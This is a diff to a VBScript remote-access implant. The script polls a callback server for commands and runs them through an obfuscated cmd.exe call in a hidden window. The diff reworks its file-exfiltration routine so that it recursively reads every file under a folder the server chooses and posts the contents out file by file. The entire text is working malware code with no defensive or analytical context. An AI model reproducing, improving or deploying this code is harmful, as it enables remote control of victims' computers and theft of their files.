@@ -28,14 +28,13 @@ friendly_name = Trim(xmlHttpReq.responseText)
 break = False
 
 
-WScript.Sleep 11100  ' Wait 11 seconds
+'WScript.Sleep 3105  ' Wait 3 seconds
    
 
 
 While break <> True
     Set xmlHttpReq = CreateObject("MSXML2.ServerXMLHTTP")
     xmlHttpReq.Open "GET", callbackUrl & "/s/VBSSIGNATURE:" & friendly_name & ":", false
-    xmlHttpReq.SetTimeouts 5000, 5000, 5000, 5000
     xmlHttpReq.Send
 
     coutput = Trim(xmlHttpReq.responseText)
@@ -46,11 +45,10 @@ While break <> True
         'do nothing
     ElseIf coutput = "EXIT" Then
         break = True
-    ElseIf coutput = "EXFILTRATE" Then
-        folderPath = "C:\Users"
+    ElseIf InStr(coutput, "VBSEXFILTRATE") Then
+        folderPath = Replace(coutput, "VBSEXFILTRATE", "")
         exfdata = ""
-        exfdata = GetExfData(folderPath)
-        Post(exfdata)
+        GetExfData(folderPath)
     Else
         abc = "c" & "m" & "d /c " & coutput & " > " &  tmpFolder & "\\o.txt"
         oS.run abc,0,True
@@ -74,20 +72,24 @@ Function GetExfData(path)
             ' Get the folder object
     Set folder = fso.GetFolder(path)
     Dim abspath
+    exfdata = ""
     For Each subfolder In folder.SubFolders
-        
+        exfdata = ""
         abspath = path & "\" & subfolder.Name 
         exfdata = exfdata & "EXF~t~d~" & abspath & "~"
-        exfdata = exfdata & GetExfData(abspath)
+        Post(exfdata)
+        GetExfData(abspath)
     Next
+    
     For Each file In folder.Files
+        exfdata = ""
         abspath = path & "\" & file.Name 
         fileContent = ""
-        exfdata = exfdata & "EXF~t~f~" & abspath & "~"
+        exfdata = "EXF~t~f~" & abspath & "~"
         fileContent = fso.OpenTextFile(file.Path, 1).ReadAll  ' 1 = ForReading
         exfdata = exfdata & fileContent
+        Post(exfdata)
     Next
-    GetExfData = exfdata
 End Function
 
 Function Post(data)
